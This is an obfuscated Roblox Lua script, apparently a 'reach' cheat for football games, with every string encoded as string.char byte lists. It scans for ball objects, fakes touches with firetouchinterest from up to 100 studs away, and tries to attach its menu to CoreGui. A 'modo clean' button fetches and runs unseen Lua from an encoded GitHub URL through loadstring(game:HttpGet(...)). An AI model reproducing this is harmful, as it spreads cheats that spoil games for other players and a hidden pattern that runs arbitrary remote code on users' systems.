local _a = game:GetService(string.char(85,115,101,114,73,110,112,117,116,83,101,114,118,105,99,101))
local _b = game:GetService(string.char(84,119,101,101,110,83,101,114,118,105,99,101))
local _c = game:GetService(string.char(83,116,97,114,116,101,114,71,117,105))
local _d = game:GetService(string.char(80,108,97,121,101,114,115))
local _e = game:GetService(string.char(82,117,110,83,101,114,118,105,99,101))
local _f = _d.LocalPlayer

local _g = 20
local _h = false
local _i = true
local _j = false
local _k = Enum.KeyCode.R
local _l = {}
local _m = 0

local _n = Instance.new(string.char(83,99,114,101,101,110,71,117,105))
_n.Name = string.char(82,101,97,99,104,77,101,110,117)
_n.ResetOnSpawn = false
_n.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
pcall(function() _n.Parent = game:GetService(string.char(67,111,114,101,71,117,105)) end)
if _n.Parent ~= game:GetService(string.char(67,111,114,101,71,117,105)) then
    _n.Parent = _f:WaitForChild(string.char(80,108,97,121,101,114,71,117,105))
end

local _o = Instance.new(string.char(70,114,97,109,101))
_o.Size = UDim2.new(0, 0, 0, 0)
_o.Position = UDim2.new(0.5, 0, 0.5, 0)
_o.AnchorPoint = Vector2.new(0.5, 0.5)
_o.BackgroundColor3 = Color3.fromRGB(5, 5, 8)
_o.BorderSizePixel = 0
_o.ClipsDescendants = true
_o.BackgroundTransparency = 1
_o.Parent = _n

local _p = Instance.new(string.char(85,73,67,111,114,110,101,114))
_p.CornerRadius = UDim.new(0, 12)
_p.Parent = _o

local _q = Instance.new(string.char(84,101,120,116,76,97,98,101,108))
_q.Size = UDim2.new(1, 0, 0, 28)
_q.Position = UDim2.new(0, 0, 0, 12)
_q.BackgroundTransparency = 1
_q.Text = string.char(114,101,97,99,104)
_q.TextColor3 = Color3.fromRGB(220, 220, 230)
_q.TextSize = 14
_q.Font = Enum.Font.GothamBold
_q.TextTransparency = 1
_q.Parent = _o

local _r = Instance.new(string.char(70,114,97,109,101))
_r.Size = UDim2.new(1, -30, 0, 100)
_r.Position = UDim2.new(0, 15, 0, 48)
_r.BackgroundTransparency = 1
_r.Parent = _o

local _s = Instance.new(string.char(70,114,97,109,101))
_s.Size = UDim2.new(1, 0, 0, 28)
_s.Position = UDim2.new(0, 0, 0, 0)
_s.BackgroundTransparency = 1
_s.Parent = _r

local _t = Instance.new(string.char(84,101,120,116,76,97,98,101,108))
_t.Size = UDim2.new(0.5, -10, 1, 0)
_t.Position = UDim2.new(0, 0, 0, 0)
_t.BackgroundTransparency = 1
_t.Text = string.char(115,116,97,116,117,115)
_t.TextColor3 = Color3.fromRGB(160, 160, 170)
_t.TextSize = 11
_t.Font = Enum.Font.GothamMedium
_t.TextXAlignment = Enum.TextXAlignment.Left
_t.TextTransparency = 1
_t.Parent = _s

local _u = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110))
_u.Size = UDim2.new(0, 40, 0, 20)
_u.Position = UDim2.new(1, -40, 0.5, -10)
_u.BackgroundColor3 = _i and Color3.fromRGB(80, 80, 90) or Color3.fromRGB(40, 40, 48)
_u.BorderSizePixel = 0
_u.Text = ""
_u.AutoButtonColor = false
_u.Parent = _s

local _v = Instance.new(string.char(85,73,67,111,114,110,101,114))
_v.CornerRadius = UDim.new(1, 0)
_v.Parent = _u

local _w = Instance.new(string.char(70,114,97,109,101))
_w.Size = UDim2.new(0, 16, 0, 16)
_w.Position = _i and UDim2.new(0, 22, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
_w.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
_w.BorderSizePixel = 0
_w.Parent = _u

local _x = Instance.new(string.char(85,73,67,111,114,110,101,114))
_x.CornerRadius = UDim.new(1, 0)
_x.Parent = _w

local _y = Instance.new(string.char(70,114,97,109,101))
_y.Size = UDim2.new(1, 0, 0, 28)
_y.Position = UDim2.new(0, 0, 0, 32)
_y.BackgroundTransparency = 1
_y.Parent = _r

local _z = Instance.new(string.char(84,101,120,116,76,97,98,101,108))
_z.Size = UDim2.new(0.5, -10, 1, 0)
_z.Position = UDim2.new(0, 0, 0, 0)
_z.BackgroundTransparency = 1
_z.Text = string.char(116,101,99,108,97)
_z.TextColor3 = Color3.fromRGB(160, 160, 170)
_z.TextSize = 11
_z.Font = Enum.Font.GothamMedium
_z.TextXAlignment = Enum.TextXAlignment.Left
_z.TextTransparency = 1
_z.Parent = _y

local _aa = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110))
_aa.Size = UDim2.new(0, 44, 0, 20)
_aa.Position = UDim2.new(1, 0, 0.5, 0)
_aa.AnchorPoint = Vector2.new(1, 0.5)
_aa.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
_aa.BorderSizePixel = 0
_aa.Text = string.char(82)
_aa.TextColor3 = Color3.fromRGB(200, 200, 210)
_aa.TextSize = 11
_aa.Font = Enum.Font.GothamBold
_aa.AutoButtonColor = false
_aa.AutomaticSize = Enum.AutomaticSize.X
_aa.Parent = _y

local _ab = Instance.new(string.char(85,73,67,111,114,110,101,114))
_ab.CornerRadius = UDim.new(0, 4)
_ab.Parent = _aa

local _ac = Instance.new(string.char(85,73,80,97,100,100,105,110,103))
_ac.PaddingLeft = UDim.new(0, 8)
_ac.PaddingRight = UDim.new(0, 8)
_ac.Parent = _aa

local _ad = Instance.new(string.char(70,114,97,109,101))
_ad.Size = UDim2.new(1, 0, 0, 32)
_ad.Position = UDim2.new(0, 0, 0, 64)
_ad.BackgroundTransparency = 1
_ad.Parent = _r

local _ae = Instance.new(string.char(70,114,97,109,101))
_ae.Size = UDim2.new(1, 0, 1, 0)
_ae.Position = UDim2.new(0, 0, 0, 0)
_ae.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
_ae.BorderSizePixel = 0
_ae.Parent = _ad

local _af = Instance.new(string.char(85,73,67,111,114,110,101,114))
_af.CornerRadius = UDim.new(1, 0)
_af.Parent = _ae

local _ag = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110))
_ag.Size = UDim2.new(0, 30, 1, 0)
_ag.Position = UDim2.new(0, 0, 0, 0)
_ag.BackgroundTransparency = 1
_ag.Text = string.char(226,136,146)
_ag.TextColor3 = Color3.fromRGB(200, 200, 210)
_ag.TextSize = 16
_ag.Font = Enum.Font.GothamBold
_ag.AutoButtonColor = false
_ag.Parent = _ae

local _ah = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110))
_ah.Size = UDim2.new(0, 30, 1, 0)
_ah.Position = UDim2.new(1, -30, 0, 0)
_ah.BackgroundTransparency = 1
_ah.Text = string.char(43)
_ah.TextColor3 = Color3.fromRGB(200, 200, 210)
_ah.TextSize = 16
_ah.Font = Enum.Font.GothamBold
_ah.AutoButtonColor = false
_ah.Parent = _ae

local _ai = Instance.new(string.char(84,101,120,116,76,97,98,101,108))
_ai.Size = UDim2.new(1, -60, 1, 0)
_ai.Position = UDim2.new(0, 30, 0, 0)
_ai.BackgroundTransparency = 1
_ai.Text = tostring(_g) .. string.char(32,115,116,117,100,115)
_ai.TextColor3 = Color3.fromRGB(220, 220, 230)
_ai.TextSize = 12
_ai.Font = Enum.Font.GothamMedium
_ai.Parent = _ae

local _aj = Instance.new(string.char(84,101,120,116,76,97,98,101,108))
_aj.Size = UDim2.new(1, 0, 0, 18)
_aj.Position = UDim2.new(0, 0, 1, -18)
_aj.BackgroundTransparency = 1
_aj.Text = string.char(70,53,32,226,128,162,32,109,101,110,117)
_aj.TextColor3 = Color3.fromRGB(100, 100, 110)
_aj.TextSize = 10
_aj.Font = Enum.Font.Gotham
_aj.TextTransparency = 1
_aj.Parent = _o

local _ak = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110))
_ak.Size = UDim2.new(0, 22, 0, 22)
_ak.Position = UDim2.new(1, -28, 0, 6)
_ak.BackgroundTransparency = 1
_ak.Text = string.char(226,154,153)
_ak.TextColor3 = Color3.fromRGB(120, 120, 130)
_ak.TextSize = 14
_ak.Font = Enum.Font.GothamBold
_ak.AutoButtonColor = false
_ak.TextTransparency = 1
_ak.Parent = _o

local _al = Instance.new(string.char(70,114,97,109,101))
_al.Size = UDim2.new(1, -30, 1, -40)
_al.Position = UDim2.new(0, 15, 0, 32)
_al.BackgroundTransparency = 1
_al.Visible = false
_al.Parent = _o

local _am = Enum.KeyCode.F5
local _an = false

local _ao = Instance.new(string.char(70,114,97,109,101))
_ao.Size = UDim2.new(1, 0, 0, 28)
_ao.Position = UDim2.new(0, 0, 0, 8)
_ao.BackgroundTransparency = 1
_ao.Parent = _al

local _ap = Instance.new(string.char(84,101,120,116,76,97,98,101,108))
_ap.Size = UDim2.new(1, -60, 1, 0)
_ap.BackgroundTransparency = 1
_ap.Text = string.char(97,98,114,105,114,32,109,101,110,117)
_ap.TextColor3 = Color3.fromRGB(200, 200, 210)
_ap.TextSize = 11
_ap.Font = Enum.Font.GothamMedium
_ap.TextXAlignment = Enum.TextXAlignment.Left
_ap.Parent = _ao

local _aq = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110))
_aq.Size = UDim2.new(0, 44, 0, 20)
_aq.Position = UDim2.new(1, 0, 0.5, 0)
_aq.AnchorPoint = Vector2.new(1, 0.5)
_aq.BackgroundColor3 = Color3.fromRGB(30, 30, 36)
_aq.BackgroundTransparency = 0
_aq.BorderSizePixel = 0
_aq.Text = string.char(70,53)
_aq.TextColor3 = Color3.fromRGB(200, 200, 210)
_aq.TextSize = 11
_aq.Font = Enum.Font.GothamBold
_aq.AutoButtonColor = false
_aq.AutomaticSize = Enum.AutomaticSize.X
_aq.Parent = _ao

local _ar = Instance.new(string.char(85,73,67,111,114,110,101,114))
_ar.CornerRadius = UDim.new(0, 4)
_ar.Parent = _aq
local _as = Instance.new(string.char(85,73,80,97,100,100,105,110,103))
_as.PaddingLeft = UDim.new(0, 8)
_as.PaddingRight = UDim.new(0, 8)
_as.Parent = _aq

local _at = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110))
_at.Size = UDim2.new(1, 0, 0, 28)
_at.Position = UDim2.new(0, 0, 0, 44)
_at.BackgroundColor3 = Color3.fromRGB(80, 15, 15)
_at.BorderSizePixel = 0
_at.Text = string.char(100,101,115,116,114,117,99,116)
_at.TextColor3 = Color3.fromRGB(255, 70, 70)
_at.TextSize = 11
_at.Font = Enum.Font.GothamBold
_at.AutoButtonColor = false
_at.Parent = _al

local _au = Instance.new(string.char(85,73,67,111,114,110,101,114))
_au.CornerRadius = UDim.new(0, 4)
_au.Parent = _at

_at.MouseButton1Click:Connect(function()
    _n:Destroy()
end)

local _av = Instance.new(string.char(84,101,120,116,66,117,116,116,111,110))
_av.Size = UDim2.new(1, 0, 0, 28)
_av.Position = UDim2.new(0, 0, 0, 76)
_av.BackgroundColor3 = Color3.fromRGB(15, 80, 15)
_av.BorderSizePixel = 0
_av.Text = string.char(109,111,100,111,32,99,108,101,97,110)
_av.TextColor3 = Color3.fromRGB(70, 255, 70)
_av.TextSize = 11
_av.Font = Enum.Font.GothamBold
_av.AutoButtonColor = false
_av.Parent = _al

local _aw = Instance.new(string.char(85,73,67,111,114,110,101,114))
_aw.CornerRadius = UDim.new(0, 4)
_aw.Parent = _av

_av.MouseButton1Click:Connect(function()
    _c:SetCore(string.char(83,101,110,100,78,111,116,105,102,105,99,97,116,105,111,110), {
        Title = string.char(109,111,100,111,32,99,108,101,97,110),
        Text = string.char(109,111,100,111,32,99,108,101,97,110,32,97,116,105,118,97,100,111,33),
        Duration = 3
    })
    loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,109,113,110,122,49,47,83,99,114,105,112,116,45,84,67,83,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,115,99,114,105,112,116,95,99,111,110,102,105,103,116,99,115,46,108,117,97)))()
end)

local _ax = Instance.new(string.char(84,101,120,116,76,97,98,101,108))
_ax.Size = UDim2.new(1, 0, 0, 20)
_ax.Position = UDim2.new(0, 0, 1, -20)
_ax.BackgroundTransparency = 1
_ax.Text = string.char(101,110,101,122,97,110,32,116,104,32,101,32,116,104,117,114)
_ax.TextColor3 = Color3.fromRGB(70, 70, 80)
_ax.TextSize = 9
_ax.Font = Enum.Font.Gotham
_ax.Parent = _al

_aq.MouseButton1Click:Connect(function()
    if _an then return end
    _an = true
    _aq.Text = string.char(46,46,46)
    _aq.TextColor3 = Color3.fromRGB(200, 200, 255)
end)

local _ay = false
local function _az()
    _ay = not _ay
    if _ay then
        _r.Visible = false
        _aj.TextTransparency = 1
        _ak.TextColor3 = Color3.fromRGB(200, 200, 220)
        _al.Visible = true
    else
        _r.Visible = true
        _aj.TextTransparency = 0
        _ak.TextColor3 = Color3.fromRGB(120, 120, 130)
        _al.Visible = false
    end
end

_ak.MouseButton1Click:Connect(function()
    if not _h then return end
    _az()
end)

local function _ba()
    _h = not _h
    local _bb = _h and UDim2.new(0, 240, 0, 180) or UDim2.new(0, 0, 0, 0)
    local _bc = _h and 0 or 1

    _b:Create(_o, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Size = _bb,
        BackgroundTransparency = _h and 0.05 or 1
    }):Play()

    local _bd = {
     _q, _t, _u, _z, _aa,
     _ae, _ai, _ag, _ah, _aj
    }
    for _be, _bf in ipairs(_bd) do
        task.delay(0.03 * (_be - 1), function()
            if _bf:IsA(string.char(84,101,120,116,76,97,98,101,108)) or _bf:IsA(string.char(84,101,120,116,66,117,116,116,111,110)) then
                pcall(function()
                    _b:Create(_bf, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
                        TextTransparency = _bc
                    }):Play()
                end)
            end
            if _bf == _u or _bf == _aa or _bf == _ae then
                pcall(function()
                    _b:Create(_bf, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
                        BackgroundTransparency = _bc
                    }):Play()
                end)
            end
        end)
    end
    task.delay(0.1, function()
        _b:Create(_w, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
            BackgroundTransparency = _bc
        }):Play()
    end)
    task.delay(0.15, function()
        _b:Create(_ak, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
            TextTransparency = _bc
        }):Play()
    end)

    if not _h and _ay then
        _ay = false
        _r.Visible = true
        _al.Visible = false
    end
end

local function _bg()
    local _bh = _i and UDim2.new(0, 22, 0.5, -8) or UDim2.new(0, 2, 0.5, -8)
    local _bi = _i and Color3.fromRGB(80, 80, 90) or Color3.fromRGB(40, 40, 48)
    _b:Create(_w, TweenInfo.new(0.2), { Position = _bh }):Play()
    _b:Create(_u, TweenInfo.new(0.2), { BackgroundColor3 = _bi }):Play()
end

local function _bj(_bk)
    local _bl = tostring(_bk)
    return _bl:match(string.char(69,110,117,109,37,46,75,101,121,67,111,100,101,37,46,40,46,43,41)) or _bl
end

local function _bm()
    _j = true
    _aa.Text = string.char(46,46,46)
    _aa.TextColor3 = Color3.fromRGB(200, 200, 255)
end

local function _bn(_bk)
    _j = false
    if _bk and _bk ~= Enum.KeyCode.Escape and _bk ~= Enum.KeyCode.F5 then
        _k = _bk
        _aa.Text = _bj(_bk)
    else
        _aa.Text = _bj(_k)
    end
    _aa.TextColor3 = Color3.fromRGB(200, 200, 210)
end

local function _bo()
    _ai.Text = tostring(_g) .. string.char(32,115,116,117,100,115)
end

_ag.MouseButton1Click:Connect(function()
    if _g > 1 then _g = _g - 1; _bo() end
end)
_ah.MouseButton1Click:Connect(function()
    if _g < 100 then _g = _g + 1; _bo() end
end)

_u.MouseButton1Click:Connect(function()
    _i = not _i
    _bg()
    _c:SetCore(string.char(83,101,110,100,78,111,116,105,102,105,99,97,116,105,111,110), { Title = string.char(114,101,97,99,104), Text = _i and string.char(97,116,105,118,97,100,111) or string.char(100,101,115,97,116,105,118,97,100,111), Duration = 1 })
end)

_aa.MouseButton1Click:Connect(function()
    if not _j then _bm() end
end)

local _bp = {}
local _bq = 0.2
local _br = false

function _bs(_bt)
    if _bt == false and _m + 0.5 > os.clock() then return end
    _m = os.clock()
    table.clear(_l)
    for _bu, _bv in pairs(_bp) do
        if os.clock() - _bv > _bq then
            _bp[_bu] = nil
        end
    end
    for _, _bw in pairs(workspace:GetDescendants()) do
        if _bw.Name == string.char(84,80,83) or _bw.Name == string.char(69,83,65) or _bw.Name == string.char(77,82,83) or _bw.Name == string.char(80,82,83) or _bw.Name == string.char(77,80,83) then
            local _bx = _bw:IsA(string.char(66,97,115,101,80,97,114,116)) and _bw
                or (_bw:IsA(string.char(77,111,100,101,108)) and (_bw.PrimaryPart or _bw:FindFirstChildWhichIsA(string.char(66,97,115,101,80,97,114,116), true)))
            if _bx then
                table.insert(_l, _bx)
            elseif _br then
                warn(string.char(91,114,101,97,99,104,93,32,98,111,108,97,32,115,101,109,32,112,97,114,116,58), _bw:GetFullName())
            end
        end
    end
    if _br then
        print(string.char(91,114,101,97,99,104,93,32,114,101,102,114,101,115,104,58), #_l, string.char(98,111,108,97,115,32,101,110,99,111,110,116,114,97,100,97,115))
    end
end
_bs(true)

local function _by()
    local _bz = _f.Character
    if not _bz then return nil end
    return _bz:FindFirstChild(string.char(82,105,103,104,116,32,76,101,103))
        or _bz:FindFirstChild(string.char(82,105,103,104,116,70,111,111,116))
        or _bz:FindFirstChild(string.char(82,105,103,104,116,76,111,119,101,114,76,101,103))
end

local function _ca(_bu, _cb, _cc)
    if _cc < 8 then
        return true
    end
    local _cd = _bu.AssemblyLinearVelocity
    if _cd.Magnitude < 12 then
        return true
    end
    local _ce = (_cb.Position - _bu.Position)
    if _ce.Magnitude < 0.1 then return true end
    return _cd.Unit:Dot(_ce.Unit) > 0
end

local function _cf()
    local _cb = _by()
    if not _cb then return end

    _bs(false)

    local _cg = _cb:FindFirstChildWhichIsA(string.char(84,111,117,99,104,84,114,97,110,115,109,105,116,116,101,114), true)
    if not _cg then
        if _br then warn(string.char(91,114,101,97,99,104,93,32,115,101,109,32,84,111,117,99,104,84,114,97,110,115,109,105,116,116,101,114,32,110,97,32,112,101,114,110,97)) end
        return
    end

    local _ch = os.clock()
    for _, _bu in pairs(_l) do
        if _bu.Parent then
            local _cc = (_bu.Position - _cb.Position).magnitude
            if _br then
                print(string.format(string.char(91,114,101,97,99,104,93,32,37,115,32,124,32,100,105,115,116,61,37,46,49,102,32,124,32,99,111,111,108,100,111,119,110,61,37,115,32,124,32,37,115),
                    _bu.Name, _cc,
                    _bp[_bu] and string.format(string.char(37,46,49,102,115), _ch - _bp[_bu]) or string.char(108,105,118,114,101),
                    _cc < _g and string.char(78,79,32,65,76,67,65,78,67,69) or string.char(102,111,114,97)))
            end
            if _cc < _g then
                if not _bp[_bu] or _ch - _bp[_bu] > _bq then
                    if _ca(_bu, _cb, _cc) then
                        _bp[_bu] = _ch
                        firetouchinterest(_bu, _cg.Parent, 0)
                        firetouchinterest(_bu, _cg.Parent, 1)
                        if _br then print(string.char(91,114,101,97,99,104,93,32,67,72,85,84,69,32,100,105,115,112,97,114,97,100,111,32,101,109), _bu.Name) end
                        break
                    elseif _br then
                        print(string.char(91,114,101,97,99,104,93,32,98,108,111,113,117,101,97,100,111,32,112,101,108,111,32,102,105,108,116,114,111,32,100,101,32,112,108,97,117,115,105,98,105,108,105,100,97,100,101))
                    end
                elseif _br then
                    print(string.char(91,114,101,97,99,104,93,32,98,108,111,113,117,101,97,100,111,32,112,101,108,111,32,99,111,111,108,100,111,119,110))
                end
            end
        end
    end
end

_a.InputBegan:Connect(function(_ci, _cj)
    if _an then
        local _bk = _ci.KeyCode
        if _bk ~= Enum.KeyCode.Escape and _bk ~= Enum.KeyCode.Unknown then
            _am = _bk
            local _ck = tostring(_bk):match(string.char(69,110,117,109,37,46,75,101,121,67,111,100,101,37,46,40,46,43,41)) or tostring(_bk)
            _aq.Text = _ck
            _aj.Text = _ck .. string.char(32,226,128,162,32,109,101,110,117)
        end
        _an = false
        _aq.TextColor3 = Color3.fromRGB(200, 200, 210)
        return
    end

    if _j then
        _bn(_ci.KeyCode)
        return
    end

    if _ci.KeyCode == _am then
        _ba()
        return
    end

    if _ci.KeyCode == _k and not _cj then
        _i = not _i
        _bg()
        _c:SetCore(string.char(83,101,110,100,78,111,116,105,102,105,99,97,116,105,111,110), { Title = string.char(114,101,97,99,104), Text = _i and string.char(97,116,105,118,97,100,111) or string.char(100,101,115,97,116,105,118,97,100,111), Duration = 1 })
        return
    end

    if _ci.KeyCode == Enum.KeyCode.Comma or _ci.KeyCode == Enum.KeyCode.Period then
        if not _cj then
            if _ci.KeyCode == Enum.KeyCode.Comma then
                if _g > 1 then _g = _g - 1; _bo() end
            else
                if _g < 100 then _g = _g + 1; _bo() end
            end
        end
        return
    end

    if _cj == false and _i then
        _cf()
    end
end)

_ba()
